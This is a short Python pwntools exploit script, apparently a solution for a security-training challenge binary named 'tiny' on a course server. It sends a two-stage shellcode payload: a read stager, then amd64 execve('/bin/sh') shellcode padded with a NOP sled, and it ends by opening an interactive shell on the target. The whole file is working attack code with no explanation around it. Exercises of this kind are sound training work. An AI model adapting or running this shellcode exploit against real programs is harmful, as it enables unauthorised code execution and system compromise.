#!/bin/python3

import sys
from pwn import *
from pwn import p32


if "--remote" in sys.argv:
    p = remote("bin.training.offdef.it", 4101)
else:
    p = process("./tiny")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x0804926b
    """)

shellcode_read = asm("""
push rdx
pop rsi
xor eax, eax
xor edi, edi
xor edx, edx
mov dl, 0xff
syscall
""", arch='amd64')

p.recvuntil(b" > ")
p.sendline(shellcode_read)

shellcode = asm("""
mov rdi, 0x0068732f6e69622f
push rdi
mov rdi, rsp

mov rax, 0x3b
mov rsi, 0
mov rdx, 0
syscall
""", arch='amd64')

total_length = len(shellcode_read)+len(shellcode)
shellcode = shellcode.rjust(total_length, b"\x90")

p.sendline(shellcode)

p.interactive()
